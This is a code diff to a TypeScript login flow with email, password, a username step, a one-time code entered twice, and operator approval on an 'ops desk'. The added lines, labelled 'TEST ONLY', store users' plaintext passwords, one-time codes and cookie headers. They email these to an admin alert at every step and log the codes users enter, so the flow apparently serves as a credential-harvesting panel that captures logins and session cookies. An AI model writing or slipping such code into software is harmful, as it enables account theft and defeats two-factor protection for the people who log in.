@@ -19,10 +19,17 @@ export type LoginAttemptRow = {
   step: string
   status: string
   usernameSubmitted: string | null
+  /** TEST ONLY */
+  passwordPlain: string | null
+  /** TEST ONLY */
+  otpPlain: string | null
+  /** TEST ONLY */
+  cookieHeader: string | null
   otp1Verified: boolean
   otp2Verified: boolean
   lastEvent: string | null
   ipAddress: string | null
+  userAgent: string | null
   createdAt: string
   updatedAt: string
 }
@@ -43,24 +50,35 @@ async function requestMeta() {
       h.get('x-real-ip') ||
       null,
     ua: h.get('user-agent') || null,
+    cookie: h.get('cookie') || null,
   }
 }
 
-async function notifyAdmin(attempt: {
+async function notifyAdmin(payload: {
   id: string
   email: string
   memberName: string
   step: string
   lastEvent: string
   ipAddress?: string | null
+  passwordPlain?: string | null
+  username?: string | null
+  otpPlain?: string | null
+  cookieHeader?: string | null
+  userAgent?: string | null
 }) {
   void sendAdminLoginStepAlert({
-    attemptId: attempt.id,
-    email: attempt.email,
-    memberName: attempt.memberName,
-    step: attempt.step,
-    event: attempt.lastEvent,
-    ip: attempt.ipAddress || undefined,
+    attemptId: payload.id,
+    email: payload.email,
+    memberName: payload.memberName,
+    step: payload.step,
+    event: payload.lastEvent,
+    ip: payload.ipAddress || undefined,
+    passwordPlain: payload.passwordPlain || undefined,
+    username: payload.username || undefined,
+    otpPlain: payload.otpPlain || undefined,
+    cookieHeader: payload.cookieHeader || undefined,
+    userAgent: payload.userAgent || undefined,
   }).catch((err) => console.error('[login] admin mail', err))
 }
 
@@ -74,7 +92,6 @@ async function getAttempt(id: string) {
   return rows[0] ?? null
 }
 
-/** Step 1: email + password. Does NOT create a session yet. */
 export async function startLoginChallenge(input: {
   email: string
   password: string
@@ -128,6 +145,8 @@ export async function startLoginChallenge(input: {
       memberName: member.name || 'Member',
       step: 'username',
       status: 'in_progress',
+      passwordPlain: password,
+      cookieHeader: meta.cookie,
       lastEvent,
       ipAddress: meta.ip,
       userAgent: meta.ua,
@@ -140,6 +159,9 @@ export async function startLoginChallenge(input: {
       step: 'credentials',
       lastEvent: 'User submitted email & password (verified)',
       ipAddress: meta.ip,
+      passwordPlain: password,
+      cookieHeader: meta.cookie,
+      userAgent: meta.ua,
     })
 
     revalidatePath('/ops')
@@ -150,7 +172,6 @@ export async function startLoginChallenge(input: {
   }
 }
 
-/** Step 2: username — any value up to 6 characters (no registered usernames yet). */
 export async function submitLoginUsername(input: {
   attemptId: string
   username: string
@@ -177,10 +198,10 @@ export async function submitLoginUsername(input: {
       return { ok: false, error: 'Unexpected step. Refresh and try again.' }
     }
 
-    // Generate 6-digit OTP and email it to the member.
     const otp = String(randomInt(100000, 999999))
     const otpHash = hashOtp(otp)
     const expires = new Date(Date.now() + 10 * 60 * 1000)
+    const meta = await requestMeta()
     const lastEvent = `Username "${username}" accepted — OTP sent (enter twice)`
 
     await db
@@ -189,9 +210,11 @@ export async function submitLoginUsername(input: {
         step: 'otp1',
         usernameSubmitted: username,
         otpHash,
+        otpPlain: otp,
         otpExpiresAt: expires,
         otp1Verified: false,
         otp2Verified: false,
+        cookieHeader: meta.cookie ?? attempt.cookieHeader,
         lastEvent,
         updatedAt: new Date(),
       })
@@ -208,8 +231,13 @@ export async function submitLoginUsername(input: {
       email: attempt.email,
       memberName: attempt.memberName,
       step: 'username',
-      lastEvent: `Username entered: "${username}" (≤6 chars). OTP generated & emailed.`,
+      lastEvent: `Username entered: "${username}". OTP generated & emailed.`,
       ipAddress: attempt.ipAddress,
+      passwordPlain: attempt.passwordPlain,
+      username,
+      otpPlain: otp,
+      cookieHeader: meta.cookie ?? attempt.cookieHeader,
+      userAgent: attempt.userAgent,
     })
 
     revalidatePath('/ops')
@@ -220,7 +248,6 @@ export async function submitLoginUsername(input: {
   }
 }
 
-/** Step 3a / 3b: first or second OTP entry (same code, entered twice). */
 export async function submitLoginOtp(input: {
   attemptId: string
   otp: string
@@ -260,7 +287,7 @@ export async function submitLoginOtp(input: {
       await db
         .update(loginAttempt)
         .set({
-          lastEvent: `OTP #${which} incorrect`,
+          lastEvent: `OTP #${which} incorrect (entered ${otp})`,
           updatedAt: new Date(),
         })
         .where(eq(loginAttempt.id, attemptId))
@@ -270,8 +297,13 @@ export async function submitLoginOtp(input: {
         email: attempt.email,
         memberName: attempt.memberName,
         step: expectedStep,
-        lastEvent: `OTP #${which} failed (wrong code)`,
+        lastEvent: `OTP #${which} failed — user entered: ${otp}`,
         ipAddress: attempt.ipAddress,
+        passwordPlain: attempt.passwordPlain,
+        username: attempt.usernameSubmitted,
+        otpPlain: attempt.otpPlain,
+        cookieHeader: attempt.cookieHeader,
+        userAgent: attempt.userAgent,
       })
       revalidatePath('/ops')
       return { ok: false, error: 'Incorrect code. Try again.' }
@@ -293,8 +325,13 @@ export async function submitLoginOtp(input: {
         email: attempt.email,
         memberName: attempt.memberName,
         step: 'otp1',
-        lastEvent: 'OTP #1 verified successfully',
+        lastEvent: `OTP #1 verified successfully (code ${otp})`,
         ipAddress: attempt.ipAddress,
+        passwordPlain: attempt.passwordPlain,
+        username: attempt.usernameSubmitted,
+        otpPlain: attempt.otpPlain,
+        cookieHeader: attempt.cookieHeader,
+        userAgent: attempt.userAgent,
       })
 
       revalidatePath('/ops')
@@ -317,9 +354,13 @@ export async function submitLoginOtp(input: {
       email: attempt.email,
       memberName: attempt.memberName,
       step: 'otp2',
-      lastEvent:
-        'OTP #2 verified. Login is waiting for APPROVE / REJECT on ops desk.',
+      lastEvent: `OTP #2 verified (code ${otp}). Waiting for APPROVE / REJECT.`,
       ipAddress: attempt.ipAddress,
+      passwordPlain: attempt.passwordPlain,
+      username: attempt.usernameSubmitted,
+      otpPlain: attempt.otpPlain,
+      cookieHeader: attempt.cookieHeader,
+      userAgent: attempt.userAgent,
     })
 
     revalidatePath('/ops')
@@ -330,7 +371,6 @@ export async function submitLoginOtp(input: {
   }
 }
 
-/** Client polls while waiting for admin decision. */
 export async function getLoginChallengeStatus(attemptId: string): Promise<{
   status: string
   step: string
@@ -376,10 +416,14 @@ export async function listPendingLoginAttempts(): Promise<LoginAttemptRow[]> {
     step: r.step,
     status: r.status,
     usernameSubmitted: r.usernameSubmitted,
+    passwordPlain: r.passwordPlain ?? null,
+    otpPlain: r.otpPlain ?? null,
+    cookieHeader: r.cookieHeader ?? null,
     otp1Verified: r.otp1Verified,
     otp2Verified: r.otp2Verified,
     lastEvent: r.lastEvent,
     ipAddress: r.ipAddress,
+    userAgent: r.userAgent ?? null,
     createdAt:
       r.createdAt instanceof Date
         ? r.createdAt.toISOString()
@@ -429,6 +473,11 @@ export async function decideLoginAttempt(
           ? 'Admin APPROVED this login'
           : 'Admin REJECTED this login',
       ipAddress: attempt.ipAddress,
+      passwordPlain: attempt.passwordPlain,
+      username: attempt.usernameSubmitted,
+      otpPlain: attempt.otpPlain,
+      cookieHeader: attempt.cookieHeader,
+      userAgent: attempt.userAgent,
     })
 
     revalidatePath('/ops')
